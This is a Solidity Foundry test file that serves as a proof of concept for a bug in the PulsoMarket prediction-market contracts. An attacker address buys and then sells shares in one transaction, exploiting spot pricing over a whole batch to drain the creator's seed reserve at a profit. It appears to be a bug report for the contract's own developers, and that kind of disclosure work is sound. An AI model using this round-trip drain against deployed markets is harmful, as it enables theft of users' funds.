// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

// PulsoMarket atomic buy->sell drain — runs against the team's OWN unmodified contracts.
//
// Reproduction (in the pulso-market repo, where OpenZeppelin + the sources already resolve):
//   1. copy this file into  test/PulsoDrain.t.sol
//   2. forge test --match-test test_AtomicRoundTripDrainsSeed -vv
//   (or, if the repo is hardhat-only, `forge init --force` alongside it, then the above.)
//
// Expected: the attacker ends the single tx with MORE USDC than it started, the trader pool is 0, and the
// market creator's seedReserve is ~fully drained. Proves the spot-price-for-whole-batch bug on both legs.

import "forge-std/Test.sol";
import "../contracts/PulsoFactory.sol";
import "../contracts/PulsoMarket.sol";
import "../contracts/MockUSDC.sol";

contract PulsoDrainTest is Test {
    MockUSDC usdc;
    PulsoFactory factory;
    address creator = address(0xC0);
    address attacker = address(0xA1);

    function setUp() public {
        usdc = new MockUSDC();
        // PulsoFactory constructor is (address _usdc, address _oracle); the deployer (this test) becomes owner
        // and an auto-whitelisted creator. Defaults per PulsoFactory.sol: minLiquidity=10 USDC, virtualMultiplier=10.
        factory = new PulsoFactory(address(usdc), address(this));
        factory.addCreator(creator);                 // owner (this) whitelists the market creator

        usdc.mint(creator, 1_000e6);
        usdc.mint(attacker, 10_000e6);
    }

    function test_AtomicRoundTripDrainsSeed() public {
        // creator opens a fresh market with the default 1000 USDC seed. (The ATTACKER needs no whitelist —
        // buyShares/sellShares are open to anyone; only market *creation* is gated.)
        vm.startPrank(creator);
        usdc.approve(address(factory), type(uint256).max);
        address mkt = factory.createMarket("Will X happen?", "test", block.timestamp + 7 days, 1_000e6);
        vm.stopPrank();

        PulsoMarket m = PulsoMarket(mkt);
        uint256 seed0 = m.seedReserve();
        assertEq(seed0, 1_000e6, "seed should be the creator's 1000 USDC");

        // attacker: single tx, buy YES then sell all of it
        vm.startPrank(attacker);
        usdc.approve(mkt, type(uint256).max);
        uint256 balBefore = usdc.balanceOf(attacker);

        uint256 shares = m.buyShares(true, 3_757e6, 0);      // buy at pre-mint spot (0.50)
        m.sellShares(true, shares, 0);                        // sell at pre-burn spot (post-buy, higher)

        uint256 balAfter = usdc.balanceOf(attacker);
        vm.stopPrank();

        emit log_named_int("attacker net P&L (6dp)", int256(balAfter) - int256(balBefore));
        emit log_named_uint("pool after", m.totalUsdcPool());
        emit log_named_uint("seed after", m.seedReserve());

        assertGt(balAfter, balBefore, "BUG: attacker profits risk-free from a buy->sell round trip");
        assertLt(m.seedReserve(), seed0 / 100, "BUG: creator's seed drained to <1% in one tx");
    }
}
